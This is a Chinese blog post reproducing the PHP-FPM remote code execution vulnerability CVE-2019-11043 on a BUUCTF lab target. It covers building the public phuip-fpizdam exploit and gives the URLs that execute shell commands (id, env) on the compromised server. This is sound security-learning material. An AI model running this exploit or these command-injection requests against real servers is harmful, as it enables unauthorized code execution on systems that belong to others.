# PHP-FPM 远程代码执行漏洞（CVE-2019-11043)的简单复现学习 - Mke2fs - 博客园

> 原文：[`www.cnblogs.com/mke2fs/p/12199093.html`](https://www.cnblogs.com/mke2fs/p/12199093.html)

1.概述

漏洞主要由于 PHP-FPM 中 sapi/ fpm/ fpm/ fpm_main.c 文件内的 env_path_info 下溢导致，攻击者可以使用换行符 %0a 破坏 Nginx 中 fastcgi_split_path_info 对应的正则表达式，导致传递给 PHP-FPM 的 PATH_INFO 值为空，从而触发该漏洞，通过发送特制的 URL 请求，在一些特殊的配置情况下会导致任意代码执行

2.复现环境（因为 exp 需要 go 语言环境编译，所以老老实实配置 go 语言环境吧）

1）下载 go 语言安装包

```
wget https://studygolang.com/dl/golang/go1.10.3.linux-amd64.tar.gz 
```

![](img/f03cae4d653a426fef5206e34441b2e6.png)

2）解压到指定目录/usr/local/下

```
root@Mke:/usr/local# tar -C /usr/local -xzf go1.10.3.linux-amd64.tar.gz 
```

![](img/2aea2f58677a0abf153442b5771cecf1.png)

3)在/etc/profile 末尾加一句话

```
vim /etc/profile
#####这一句，是添加 go 语言的环境变量，全局调用
export PATH=$PATH:/usr/local/go/bin
```

4）然后使得配置生效

```
source /etc/profile
```

查看一下 go 语言环境

![](img/8cd3c950ca5588f96105a681fb161adb.png)

完美

3.下载工具包（exp）

```
go get github.com/neex/phuip-fpizdam
####下载完成后会在当前目录下生成一个 go 目录
cd go/src/ ####切换到这个目录下，编译 go 源码
go build github.com/neex/phuip-fpizdam
####编译完成会生成一个 phuip-fpizdam 文件
```

![](img/bce0a28917b059e528e295b2c9087bfa.png)

4.测试漏洞

靶机：[`613-d9f884cd-dfd6-4afa-985b-5a215d575ad9node3.buuoj.cn:26779/index.php`](http://613-d9f884cd-dfd6-4afa-985b-5a215d575ad9node3.buuoj.cn:26779/index.php)

注：漏洞环境懒得搭，所以用 buuctf 的漏洞环境作为靶场（嗯，赵师傅 NB！！！）

攻击步骤嘛

```
./phuip-fpizdam 目标地址/index.php
```

![](img/88d8042b539a955d04440ee7f5ed2448.png)

访问·一下目标地址

[`613-d9f884cd-dfd6-4afa-985b-5a215d575ad9node3.buuoj.cn:26779/index.php?a=/bin/sh+-c+%27which+which%27`](http://613-d9f884cd-dfd6-4afa-985b-5a215d575ad9node3.buuoj.cn:26779/index.php?a=/bin/sh+-c+%27which+which%27)

![](img/8196f460c670eebc1439c22a33586c83.png)

查看一下当前权限

[`613-d9f884cd-dfd6-4afa-985b-5a215d575ad9node3.buuoj.cn:26779/index.php?a=id`](http://613-d9f884cd-dfd6-4afa-985b-5a215d575ad9node3.buuoj.cn:26779/index.php?a=id)

![](img/2da45478eac5a940477dced2afb55653.png)

 复现基本结束

菜鸡笔记—-2020-1-14

末尾送个彩蛋，参数 a=env 即可 Get Flag   ，/笑